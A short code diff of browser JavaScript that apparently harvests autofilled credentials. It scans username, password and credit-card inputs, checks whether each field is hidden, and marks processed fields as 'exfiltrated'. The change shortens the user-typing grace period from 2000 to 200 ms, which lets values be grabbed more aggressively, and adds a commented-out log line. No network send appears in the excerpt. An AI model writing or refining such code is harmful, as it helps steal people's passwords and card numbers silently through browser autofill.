@@ -141,7 +141,7 @@
   // hidden detection
   let lastUserTypeAt = 0;
   document.addEventListener('input', () => lastUserTypeAt = Date.now(), { capture: true });
-  const USER_TYPE_GRACE_MS = 2000;
+  const USER_TYPE_GRACE_MS = 200;
   function isHiddenEl(el) {
     try {
       const rect = el.getBoundingClientRect();
@@ -206,7 +206,10 @@
         if (!(ac.includes('username') || ac.includes('current-password') || ac.includes('new-password') || ac.includes('cc-'))) continue;
         const val = inp.value || '';
         if (!val) continue;
-        if (Date.now() - lastUserTypeAt < USER_TYPE_GRACE_MS) continue;
+        if (Date.now() - lastUserTypeAt < USER_TYPE_GRACE_MS) {
+          // log('Skipping ' + (inp.name||inp.id) + ' due to user interaction grace period');
+          continue;
+        }
         if (inp.dataset.exfiltrated === '1') continue;
 
         const hidden = isHiddenEl(inp);
